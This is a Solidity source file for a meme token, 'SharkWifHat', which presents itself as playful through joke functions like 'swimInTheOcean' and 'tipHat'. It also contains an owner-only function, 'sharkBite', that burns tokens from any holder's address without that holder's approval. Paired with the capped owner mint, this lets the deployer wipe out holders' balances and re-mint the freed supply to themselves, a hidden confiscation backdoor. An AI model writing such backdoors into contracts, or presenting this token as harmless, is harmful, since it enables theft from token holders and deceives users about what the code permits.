// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SharkWifHat is ERC20, ERC20Burnable, Ownable {
    uint256 private constant MAX_SUPPLY = 1_000_000_000 * 10 ** 18; // 1 billion tokens

    constructor() ERC20("SharkWifHat", "SWH") Ownable(msg.sender) {
        _mint(msg.sender, MAX_SUPPLY);
    }

    function mint(address to, uint256 amount) public onlyOwner {
        require(
            totalSupply() + amount <= MAX_SUPPLY,
            "Cannot exceed max supply"
        );
        _mint(to, amount);
    }

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function sharkBite(address target, uint256 amount) public onlyOwner {
        _burn(target, amount);
    }

    function swimInTheOcean() public pure returns (string memory) {
        return "Shark wif a hat is swimming in the ocean!";
    }

    function tipHat() public pure returns (string memory) {
        return "Shark tips its hat politely";
    }
}
